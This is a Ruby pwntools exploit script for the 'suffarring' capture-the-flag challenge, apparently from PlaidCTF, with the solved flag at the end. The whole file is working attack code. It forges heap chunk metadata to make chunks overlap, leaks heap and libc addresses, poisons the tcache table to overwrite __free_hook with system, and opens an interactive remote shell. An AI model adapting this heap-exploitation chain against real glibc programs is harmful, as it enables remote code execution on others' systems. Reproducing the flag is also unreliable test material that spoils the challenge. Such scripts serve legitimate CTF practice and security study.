#!/usr/bin/env ruby
# encoding: ascii-8bit
require 'pry'
require 'pwn'        # https://github.com/peter50216/pwntools-ruby
require 'heapinfo'   # https://github.com/david942j/heapinfo
require 'one_gadget' # https://github.com/david942j/one_gadget

# @magic = one_gadget(file: './libc.so.6')[0]

host, port = 'suffarring.pwni.ng', 7361
@local = false
if ARGV.empty?
  host = '127.0.0.1'; @local = true
else
  raise ArgumentError, 'host not set' if host.empty?
end
$z = Sock.new host, port
def z;$z;end
@p = 'suffarring'
def h;@h ||= heapinfo(@p);end
def elf; @elf ||= ELF.new(@p); end
def debug!; context.log_level = :debug; end
#================= Exploit Start ====================
context.arch = :amd64
# debug!

def pt(t = nil, e = "\n")
  z.gets '> '
  z.write t.to_s + e if t
end

@slots = Array.new(16) { true }
def add(s)
  pt("A")
  pt(s.size)
  pt(s, '')
  @slots.find_index(&:itself).tap { |i| @slots[i] = false }
end

def del(idx)
  fail unless @slots[idx] == false
  pt('D')
  pt(idx)
  @slots[idx] = true
end

def recant(idx, needle)
  pt('R')
  pt(idx)
  pt(needle.size)
  pt(needle, '')
end

def show(idx)
  pt('P')
  pt(idx)
end

needle = 'A' * 0x18 + p64(0x81) + 0xff.p16 # forge chunk size
tmp = add('t' * needle.size)

id1 = add('o' * 3)
del(id1)
# add('w' * 0x28)
# x = add('x' * 0x38)
w = add('w' * 0x28)
# del(x)
a = add(needle[0..-2])
add('z' * 0x18) # consume 0x20

del(tmp)

recant(a, needle)
del(a) # chunk overlap
padding = flat([0] * 5, 0x21, [0x7a]*3, 0x31)
overlap = add(flat(padding, [0x77]*5))
del(w)
show(overlap)
z.readn(0x50)
heap = z.readn(8).u64 - 0x1270
h.offset(heap)
log.dump heap.hex
add('whatever')
hack_idx = add('hacked')
log.dump hack_idx

u = add('u' * 0x90) # to have smallbin chunk
add('k') # prevent merging with top_chunk
del u

# now we can change data of `overlap` to forge the meta of `hack_idx`
del(overlap)
addr = heap + 0x3b80
overlap = add(flat([0] * 5, 0x21, [0x7a]*3, 0x31, [8, addr, 0, 0, 0]))
show(hack_idx)
libc = z.readn(8).u64 - 0x3ebca0
log.dump libc.hex
h.offset(libc)

# free the TcacheEntry table and have fun
del(overlap)
overlap = add(padding + flat([0, heap+0x10, 0, 0, 0]))
del(hack_idx)

# fuck up TcacheEntry table
free_hook = libc + 0x00000000003ed8e8
add(flat(1, [0] * 7, free_hook).ljust(0x240, "\x00"))
add(flat(system = libc + 0x4f440))
del(add("sh\x00"))

z.interact

# PCTF{You-hav3-suff3r3d-so-h3r3's-your-sh1ny-r1ng}
